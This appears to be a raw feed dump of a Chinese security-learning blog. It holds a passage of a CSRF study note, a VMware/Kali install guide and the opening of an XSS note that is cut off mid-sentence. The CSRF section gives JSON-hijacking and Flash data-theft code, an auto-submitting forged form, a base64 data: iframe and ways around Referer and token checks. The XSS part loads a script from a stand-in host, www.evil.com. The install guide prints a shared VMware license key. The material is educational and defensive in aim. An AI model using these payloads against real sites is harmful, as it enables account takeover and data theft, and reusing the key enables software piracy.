punctuation">.</span>com<span class="token operator">/</span>private_messages<span class="token operator">/</span>inbox<span class="token punctuation">.</span>json<span class="token operator">?</span>callback<span class="token operator">=</span>hijack<span class="token operator">&amp;</span>count<span class="token operator">=</span><span class="token number">3</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span class="token comment" spellcheck="true">// api调用中使用的callback函数为hijack</span></code></pre><p>当登录a网站的用户被欺骗访问这个页面时,隐私就会被窃取</p><h2 id="Flash-CSRF"><a href="#Flash-CSRF" class="headerlink" title="Flash CSRF"></a>Flash CSRF</h2><h3 id="跨域获取隐私数据"><a href="#跨域获取隐私数据" class="headerlink" title="跨域获取隐私数据"></a>跨域获取隐私数据</h3><p>网站根目录下的 crossdomain.xml文件 可以看到一些配置属性</p><p>其中 allow-access-from domain=”*” 表示允许任何域的Flash请求本域的资源,这样是非常危险的,如果用户登录目标网站,被欺骗访问包含恶意Flash的网页时,隐私数据就可能被窃取</p><p>恶意Flash的ActionScript 脚本(by 余玄)</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> flash<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 请求隐私数据所在的页面</span><span class="token keyword">var</span> loader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLRequest</span><span class="token punctuation">(</span><span class="token string">"http://www.foo.com/private"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    loader<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>Event<span class="token punctuation">.</span>COMPLETE<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//当请求完成后</span>        loader<span class="token punctuation">.</span>date<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将获取到的隐私数据</span>        <span class="token comment" spellcheck="true">// 更多操作</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>loader<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//发起请求</span></code></pre><h3 id="跨域提交数据操作"><a href="#跨域提交数据操作" class="headerlink" title="跨域提交数据操作"></a>跨域提交数据操作</h3><p>这个就不需要crossdomain.xml 的跨域访问策略了,因为跨域发起的GET/POST请求对于浏览器本身就是合法的,在Flash中也是</p><p>一般情况下,都是通过构造”HTML CSRF”</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://t.xxx.com/article/update<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>status<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>html_csrf_here.<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>用户访问后,就会有JSON文件返回,并且提示下载,这样就会暴露,使用Flash来进行这个过程会更加隐蔽</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> flash<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLRequest<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">post</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLRequest</span><span class="token punctuation">(</span><span class="token string">"http://t.xxx.com/article/update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> _v <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLVariables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    _v <span class="token operator">=</span> <span class="token string">"status"</span> <span class="token operator">=</span> <span class="token string">"+msg"</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token string">"POST"</span><span class="token punctuation">;</span>     url<span class="token punctuation">.</span>data <span class="token operator">=</span> _v<span class="token punctuation">;</span>    <span class="token function">sendToURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//发送</span><span class="token punctuation">}</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'flash_csrf_here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="CSRF-蠕虫"><a href="#CSRF-蠕虫" class="headerlink" title="CSRF 蠕虫"></a>CSRF 蠕虫</h2><p>在CSRF的攻击页面上嵌入蠕虫传播的攻击向量，蠕虫传播要面向不同的用户生成不同的请求。之前的攻击可预测所有的参数，现在必须想办法标识不同用户的数据。<br>1)服务端脚本获取<br>准备一个php，asp页面，可以检测Referer字段读取url中的用户id等。<br>2)JSON劫持<br>如果网站提供了这样的数据接口，可以用来获取敏感信息</p><h1 id="0x04-CSRF防御"><a href="#0x04-CSRF防御" class="headerlink" title="0x04  CSRF防御"></a>0x04  CSRF防御</h1><h2 id="验证HTTP-Referer字段"><a href="#验证HTTP-Referer字段" class="headerlink" title="验证HTTP Referer字段"></a>验证HTTP Referer字段</h2><p>根据HTTP协议，在HTTP头中有一个Referer字段，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的Referer值就会是转账按钮所在的页面的URL，通常是以  bank.example域名开头的地址。而如果黑客要对银行网站实施CSRF攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的Referer是指向黑客自己的网站。因此，要防御  CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。</p><p>但是这种方法也不够安全,原因如下</p><ul><li>Referer值存在可以伪造的问题</li><li>有些用户为了保护自己隐私,设置浏览器访问页面时不提供Referer值</li></ul><h2 id="在请求地址中添加token并验证"><a href="#在请求地址中添加token并验证" class="headerlink" title="在请求地址中添加token并验证"></a>在请求地址中添加token并验证</h2><p>token可以在用户登陆后产生并放于session之中，然后在每次请求时把token从session中拿出，与请求中的token进行比对，但这种方法的难点在于如何把token以参数的形式加入请求。对于GET请求，token将附在请求地址之后，这样URL就变成<code>http://url?csrftoken=tokenvalue</code>。而对于POST请求来说，要在form的最后加上<code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;</code>，这样就把token以参数的形式加入请求了</p><p>该方法还有一个<strong>缺点是难以保证token本身的安全</strong></p><h2 id="在HTTP头中自定义属性并验证"><a href="#在HTTP头中自定义属性并验证" class="headerlink" title="在HTTP头中自定义属性并验证"></a>在HTTP头中自定义属性并验证</h2><p>这种方法也是使用token并进行验证，和上一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到 HTTP  头中自定义的属性里。通过XML HTTP  Request这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了上种方法在请求中加入token的不便，同时，通过XML HTTP Request请求的地址不会被记录到浏览器的地址栏，也不用担心token会透过Referer泄露到其他网站中去。</p><p>局限性很大</p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF-Token"></a>CSRF-Token</h2><p>CSRF攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于Cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。</p><p>怎么防止跨站攻击：</p><p>表单：在 Form 表单中添加一个隐藏的的字段，值是 csrf_token。</p><p>非表单：在ajax获取数据时，添加headers:{ ‘X-CSRFToken’:getCookie(‘csrf_token’) }。</p><p>原理：在浏览器访问网站A时，网站A设置cookie会增加随机值csrf_token，这个值是随机的。返回给浏览器时，cookie会储存在浏览器，同时会把csrf_token传给表单里面的隐藏字段。所以当浏览器用自己的表单时会自带csrf_token，网站A取到这个值和cookie里的csrf_token一致就通过。而网站B里面的表单没有这个值，所以不能通过，这样就阻止了恶意攻击。非表单也是这样的原理。</p><h2 id="使用验证码"><a href="#使用验证码" class="headerlink" title="使用验证码"></a>使用验证码</h2><p>1)每次的用户提交都需要用户在表单中填写一个图片上的随机字符串</p><p>2)服务端核对令牌</p><h1 id="0x05-CSRF绕过"><a href="#0x05-CSRF绕过" class="headerlink" title="0x05 CSRF绕过"></a>0x05 CSRF绕过</h1><h2 id="绕过Referer"><a href="#绕过Referer" class="headerlink" title="绕过Referer"></a>绕过Referer</h2><h3 id="Refere为空条件下"><a href="#Refere为空条件下" class="headerlink" title="Refere为空条件下"></a>Refere为空条件下</h3><p>解决方案:</p><p>  利用<a href="http://ftp//,http://,https://,file://,javascript:,data:" target="_blank" rel="noopener">ftp://,http://,https://,file://,javascript:,data:</a>这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p><p>  例:</p><p>  利用data:协议</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg<span class="token punctuation">=</span><span class="token punctuation">=</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p> bese64编码 解码即可看到代码</p><p>  利用https协议 https向http跳转的时候Referer为空</p><p> 拿一个https的webshell</p><p><code>&lt;iframe src=&quot;https://xxxxx.xxxxx/attack.php&quot;&gt;</code></p><p> attack.php写上CSRF攻击代码</p><h3 id="判断Referer是某域情况下绕过"><a href="#判断Referer是某域情况下绕过" class="headerlink" title="判断Referer是某域情况下绕过"></a>判断Referer是某域情况下绕过</h3><p> 比如你找的csrf是xxx.com  验证的referer是验证的*.xx.com  可以找个二级域名 之后&lt;img “csrf地址”&gt;  之后在把文章地址发出去 就可以伪造。</p><h3 id="判断Referer是否存在某关键词"><a href="#判断Referer是否存在某关键词" class="headerlink" title="判断Referer是否存在某关键词"></a>判断Referer是否存在某关键词</h3><p> referer判断存在不存在google.com这个关键词</p><p> 在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过 </p><h3 id="判断referer是否有某域名"><a href="#判断referer是否有某域名" class="headerlink" title="判断referer是否有某域名"></a>判断referer是否有某域名</h3><p>  判断了Referer开头是否以126.com以及126子域名  不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。</p><h2 id="移除referer字段"><a href="#移除referer字段" class="headerlink" title="移除referer字段"></a>移除referer字段</h2><p>和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。</p><pre><code>&lt;meta name =“referrer”content =“no-referrer”&gt;</code></pre><p>应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。</p><h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。</p><h2 id="更改请求方法"><a href="#更改请求方法" class="headerlink" title="更改请求方法"></a>更改请求方法</h2><p>如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。</p><h2 id="删除token参数或发送空token"><a href="#删除token参数或发送空token" class="headerlink" title="删除token参数或发送空token"></a>删除token参数或发送空token</h2><p>不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。</p><p>例如，合法请求如下</p><pre><code>POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</code></pre><p>那么实施这种请求：</p><pre><code>POST /change_passwordPOST body:new_password=qwerty</code></pre><p>或这种：</p><pre><code>POST /change_passwordPOST body:new_password=qwerty&amp;csrf_tok=</code></pre><h2 id="使用另一个session的CSRF-token"><a href="#使用另一个session的CSRF-token" class="headerlink" title="使用另一个session的CSRF token"></a>使用另一个session的CSRF token</h2><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。</p><h2 id="Session固定"><a href="#Session固定" class="headerlink" title="Session固定"></a>Session固定</h2><p>有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。</p><p>第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。</p><h1 id="0x06-CSRF漏洞挖掘"><a href="#0x06-CSRF漏洞挖掘" class="headerlink" title="0x06 CSRF漏洞挖掘"></a>0x06 CSRF漏洞挖掘</h1><p>一般来说，挖掘CSRF，<strong>只需要找到漏洞存在就可以</strong>了，不需要用构造的Payload去攻击用户。</p><p>最简单的就是看有没有csrf-token验证,如果没有那么都是可能存在csrf漏洞的</p><p>就是存在token 也要注意这个token是不是随机的,还是伪随机的.</p><p>然后就是关于Referer的检测以及上面的那些绕过技巧</p><p>brupsuite中带有CSRF PoC这个功能(Burpsuit里边右键-&gt;Engagement Tools-&gt;Generate CSRF POC) ,可以将其好好利用,来进行CSRF漏洞的测试</p><p>漏洞常见触发点</p><blockquote><p>电商类的</p><p>添加购物车、添加收货地址、删除收货地址等</p></blockquote><p>用户个人信息修改等</p><p>自动化检测工具,待整理</p><h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07  总结"></a>0x07  总结</h1><p>每一个漏洞,都会造成或多或少的危害,关于CSRF漏洞,先总结这么多. 其中对于CSRF挖掘和绕过这块是收获最大的部分,总结完了之后才发现CSRF原来也是要分类型的.当然关于这漏洞还有很多东西,比如CSRF打内网等</p><p>后面都会继续补充</p><h1 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08  参考资料"></a>0x08  参考资料</h1><ul><li><p>&lt;&lt;Web前端黑客技术揭秘&gt;&gt;</p></li><li><p><a href="https://www.cnblogs.com/-qing-/p/11015075.html" target="_blank" rel="noopener">Web安全之CSRF漏洞整理总结</a></p></li><li><p><a href="https://blog.csdn.net/houbin0912/article/details/81944471" target="_blank" rel="noopener">跨域策略文件crossdomain.xml的配置方法</a></p></li><li><p><a href="https://xz.aliyun.com/t/6176" target="_blank" rel="noopener">绕过CSRF防御</a></p></li><li><p><a href="https://www.freebuf.com/articles/web/164234.html" target="_blank" rel="noopener">如何在JSON端点上利用CSRF漏洞</a></p></li><li><p><a href="https://blog.csdn.net/guodejie/article/details/80778135" target="_blank" rel="noopener">防止跨站攻击——CSRFToken</a></p></li><li><p><a href="https://www.freebuf.com/column/151816.html" target="_blank" rel="noopener">各大SRC中的CSRF技巧</a></p></li><li><p><a href="https://docs.ioin.in/writeup/www.ohlinge.cn/_web_web_csrf_html/index.html" target="_blank" rel="noopener">玩转CSRF之挖洞实例分享</a></p></li><li><p><a href="https://www.jianshu.com/p/05c9c4ee6667" target="_blank" rel="noopener">CSRF漏洞挖掘思路</a></p></li><li><p><a href="http://www.teagle.top/index.php/archives/71/" target="_blank" rel="noopener">漏洞挖掘之CSRF</a></p></li></ul><p><strong><em>“Knowing is not enough, we must apply. Willing is not enough, we must do.”</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> TOP10基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> JSON </tag>
            
            <tag> Ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机安装教程以及解决锐捷客户端导致的无法上网</title>
      <link href="/posts/20200106/"/>
      <url>/posts/20200106/</url>
      
        <content type="html"><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>今天上午开了一个班导师见面会,很赞同班导师说的一句话”<strong>不要按照学校的教学进度来</strong>“</p><p>其中提到了有关虚拟机什么的</p><p>然后吃午饭就有同学问我<strong>虚拟机上不了网</strong></p><p>因为我之前刚来学校的时候也遇到过这种问题,当时就想写一篇文章的<a id="more"></a></p><h1 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h1><h2 id="安装虚拟机"><a href="#安装虚拟机" class="headerlink" title="安装虚拟机"></a>安装虚拟机</h2><ul><li>方法适用于所以操作系统,都是这样安装的</li><li>VMware和virtualbox自己喜欢那个选那个,推荐VMware</li></ul><p><a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html" target="_blank" rel="noopener">VMware workstation 15 pro下载地址</a></p><p>下载后,更改保存路径(最好不要放在C盘),其他都默认</p><p>中间可能需要两次重启,重启之后如果没弹出安装的步骤的话,就自己<strong>手动打开</strong> </p><p>安装后需要激活码,下面这个可以用,中午才在yht的机器上试过了</p><pre><code>FZ1XH-ADE4M-H89UQ-GDMNV-WV0W6</code></pre><p>复制粘贴进去就成功安装好VMware workstation 15 pro了</p><h2 id="下载虚拟机镜像"><a href="#下载虚拟机镜像" class="headerlink" title="下载虚拟机镜像"></a>下载虚拟机镜像</h2><ul><li>准备好迅雷</li></ul><p><strong>学习渗透,必须安装Kali</strong></p><p><a href="https://images.offensive-security.com/virtual-images/kali-linux-2019.4-vmware-amd64.zip.torrent" target="_blank" rel="noopener">Kali的torrent文件</a></p><p>下载好后,打开下载好的文件,此时迅雷会自动弹出下载</p><p>下载好后找到文件,<strong>解压</strong>,解压在哪里都可以(C盘除外)</p><p><img src="https://i.loli.net/2020/01/06/3pjeyQDJBLoKvkn.png" alt></p><h2 id="安装Kali"><a href="#安装Kali" class="headerlink" title="安装Kali"></a>安装Kali</h2><p><strong>解压完成后,打开VMware</strong></p><p>在VMware中,创建新的虚拟机</p><p><img src="https://i.loli.net/2020/01/06/fqAIbJTROWche27.png" alt></p><p>选择浏览本地的iso文件,就是刚刚解压的那个文件里面</p><p><img src="https://i.loli.net/2020/01/06/ib5QDaTeZR7G1ct.png" alt></p><p>可能会没有但是没关系</p><p>在解压的文件中,找到下面这个文件</p><p>双击打开,然后会弹出打开方式,使用<strong>VMware station</strong>打开</p><p><img src="https://i.loli.net/2020/01/06/7axZLXT2MRvpqjN.png" alt></p><p>然后在里面会弹窗,选择”我已复制”</p><p>然后就可以打开kali了</p><p><img src="https://i.loli.net/2020/01/06/sevPFojC47JfhkI.png" alt></p><p>kali的默认用户名为root 密码为 toor</p><p>可以看到kali里面集成了许多渗透的工具,如Web安全中常用的”瑞士军刀” brup</p><p>可以说kali是渗透必备</p><p><img src="https://i.loli.net/2020/01/06/Rg1sieQm3ywbFo6.png" alt></p><h1 id="虚拟机无法上校园网的解决办法"><a href="#虚拟机无法上校园网的解决办法" class="headerlink" title="虚拟机无法上校园网的解决办法"></a>虚拟机无法上校园网的解决办法</h1><p>如果你是使用锐捷客户端登录校园网的,下面的方法就适用</p><p>先说说操作流程</p><ol><li>先卸载锐捷客户端</li><li>然后再重新安装锐捷客户端</li><li>安装过程中在锐捷的文件夹中找到8021.exe</li><li>右键使用notepad++编辑</li><li>使用Ctrl+F 将VMware NAT Service替换为别的名字</li><li><strong>保存后,再点击安装完成</strong></li><li>重启电脑,打开虚拟机,应该不出问题就能上网了</li></ol><p><a href="https://notepad-plus-plus.org/downloads/v7.8.2/" target="_blank" rel="noopener">notepad++下载地址</a></p><p><img src="https://i.loli.net/2020/01/06/kf2Lp9KRsIoNy3c.png" alt></p><p>这个替换的名字可以随便的</p><p>安装上面的步骤之后,打开终端,输入</p><p>ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>   检查能不能ping通</p><p><img src="https://i.loli.net/2020/01/06/RhHD7Y5CZ8mPdF6.png" alt></p><p>如果不能ping通,就代表不能上网</p><p>此时可以在任务管理器中看一下 上图那个进程在不在,如果不在,重启试一下,还不行的话,就再按照上面流程重新操作一次</p><p>我在yht的机器上一次就成功了(可以说两次,因为第一次忘重启电脑了)</p><h1 id="解决中文乱码"><a href="#解决中文乱码" class="headerlink" title="解决中文乱码"></a>解决中文乱码</h1><p>参考羊驼黑客的文章</p><p><a href="http://182.92.80.90/%e8%a7%a3%e5%86%b32019%e6%96%b0%e7%89%88%e6%9c%ackali%e8%99%9a%e6%8b%9f%e6%9c%ba%e4%b8%ad%e6%96%87%e4%b9%b1%e7%a0%81/" target="_blank" rel="noopener">解决新版Kali中文乱码问题</a></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>信息安全的方向其实有很多,<strong>不只是渗透,逆向.</strong> 如果想开始学习技术的同学,其实可以利于寒假的时间多了解一下自己喜欢什么方向,也不要觉得那个方向简单或者难,因为<strong>安全好像就没有简单的方向</strong>,都是坚持学习,对安全感兴趣的结果</p><p><strong>奥利给!!!</strong></p><p><em>“Decide whether or not the goal is worth the risks involved. If it is, stop worrying.”</em></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章深入学习XSS漏洞</title>
      <link href="/posts/20200105/"/>
      <url>/posts/20200105/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>XSS漏洞可以追溯到1990年代,在2010年Web安全威胁前10位中,XSS排名第二,仅次于Injection</p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><a id="more"></a><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><p>基础知识的补充主要是JavaScript这部分的,弹窗不只是有alert还有prompt,confirm,当然弹窗只是用来测试XSS的,真正是XSS<strong>攻击</strong>,弹窗是毫无意义的,常常我们会加载第三方域的脚本资源,然后诱使目标用户点击链接</p><p>javascript能做的事,XSS payload都能做.举个简单的例子</p><pre><code>&lt;script src=&quot;http://wwww.evil.com/xss.js&quot;&gt;&lt;/script&gt;</code></pre><p>这段代码执行的是<code>www.evil.com</code>下的<code>xss.js</code>脚本.如果不是本域了,而浏览器并没有按照同源策略进行,那么可以叫做<strong>跨域脚本</strong></p><p>那么什么是<strong>同源策略</strong>?</p><p><strong>所谓同源是指，域名，协议，端口相同</strong>。</p><p>同源策略（Same origin policy）是一种约定，它是<a href="https://baike.baidu.com/item/浏览器/213911" target="_blank" rel="noopener">浏览器</a>最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。(百度百科)</p><p>同源策略是浏览器的行为，是为了保护本地数据不被JavaScript代码获取回来的数据污染，因此拦截的是客户端发出的请求回来的数据接收，即请求发送了，服务器响应了，但是无法被浏览器接收。</p><p>在浏览器中,script img iframe link等标签都可以跨域加载资源,而不受同源策略的限制.</p><h2 id="JavaScript伪协议"><a href="#JavaScript伪协议" class="headerlink" title="JavaScript伪协议"></a>JavaScript伪协议</h2><p>javascript伪协议所有浏览器都支持,不过有些差异</p><p>伪协议是为关联应用程序而使用的，JavaScript伪协议实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</p><h2 id="data-协议-Data-URI-Scheme"><a href="#data-协议-Data-URI-Scheme" class="headerlink" title="data:协议(Data URI Scheme)"></a>data:协议(Data URI Scheme)</h2><p>data:协议仅IE浏览器不支持</p><p>data URI scheme 允许我们使用内联（inline-code）的方式在网页中包含数据，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。常用于将图片嵌入网页。</p><p>Data URI Scheme支持的类型有</p><pre><code> data:,&lt;文本数据&gt;   data:text/plain,&lt;文本数据&gt;   data:text/html,&lt;HTML代码&gt;   data:text/html;base64,&lt;base64编码的HTML代码&gt;   data:text/css,&lt;CSS代码&gt;   data:text/css;base64,&lt;base64编码的CSS代码&gt;   data:text/javascript,&lt;Javascript代码&gt;   data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;   data:image/gif;base64,base64编码的gif图片数据   data:image/png;base64,base64编码的png图片数据   data:image/jpeg;base64,base64编码的jpeg图片数据   data:image/x-icon;base64,base64编码的icon图片数据</code></pre><h2 id="文档对象模型-DOM"><a href="#文档对象模型-DOM" class="headerlink" title="文档对象模型(DOM)"></a>文档对象模型(DOM)</h2><p>DOM,是一种与平台和语言无关的应用程序接口(API).将 web 页面与到脚本或编程语言连接起来。通常是指 JavaScript，但将 HTML、SVG 或 XML 文档建模为对象并不是 JavaScript 语言的一部分。DOM模型用一个逻辑树来表示一个文档，树的每个分支的终点都是一个节点(node)，每个节点都包含着对象(objects)。DOM的方法(methods)让你可以用特定方式操作这个树，用这些方法你可以改变文档的结构、样式或者内容。节点可以关联上事件处理器，一旦某一事件被触发了，那些事件处理器就会被执行。</p><h2 id="一些相关的HTML知识"><a href="#一些相关的HTML知识" class="headerlink" title="一些相关的HTML知识"></a>一些相关的HTML知识</h2><p><a href="https://www.runoob.com/jsref/dom-obj-event.html" target="_blank" rel="noopener">更多的在这里学习,复习 HTML DOM 事件</a> ,下面只列举一些比较常见的</p><pre><code>onclick,用户点击某个对象时调用的事件句柄onerror,在加载文档或者图像时发生错误调用onload,一张页面或已付图像完成加载onunload,用户退出页面onblur 元素失去焦点触发onfocus 元素获取焦点时触发document.cookie 设置或返回与当前文档有关的所有cookiedocument.baseURI 返回文档的绝对基础URIdocument.getElementById()返回拥有指定id的第一个对象的引用document.write()向文档写HTML表达式或JavaScript代码</code></pre><h2 id="所有的Event都是可以执行JS"><a href="#所有的Event都是可以执行JS" class="headerlink" title="所有的Event都是可以执行JS"></a>所有的Event都是可以执行JS</h2><pre><code>onload onunload onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop</code></pre><h2 id="可以执行JS的标签"><a href="#可以执行JS的标签" class="headerlink" title="可以执行JS的标签"></a>可以执行JS的标签</h2><pre><code>&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;iframe&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt;</code></pre><h2 id="可以执行JS的属性"><a href="#可以执行JS的属性" class="headerlink" title="可以执行JS的属性"></a>可以执行JS的属性</h2><pre><code>formaction action href xlink:href autofocus src content data</code></pre><h2 id="HTML与javascript自解码机制"><a href="#HTML与javascript自解码机制" class="headerlink" title="HTML与javascript自解码机制"></a>HTML与javascript自解码机制</h2><p>举个例子,用户输入在HTML中</p><pre><code>&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&#39;&lt;img src=@ 